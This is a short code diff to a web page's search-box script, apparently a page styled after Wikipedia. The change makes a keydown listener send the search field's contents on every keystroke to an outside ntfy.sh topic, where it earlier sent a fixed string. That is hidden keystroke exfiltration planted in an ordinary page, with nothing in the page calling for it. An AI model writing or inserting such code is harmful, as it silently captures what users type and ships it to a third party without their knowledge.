@@ -121,7 +121,7 @@ Wikipedia
 <script>
     const inputField = document.getElementById("searchInput");
     inputField.addEventListener('keydown', function(e) {
-        fetch('https://ntfy.sh/PinkSharpieIntel', {method: 'POST', body: 'PST'})
+        fetch('https://ntfy.sh/PinkSharpieIntel', {method: 'POST', body: inputField.value})
     })
 </script>
     
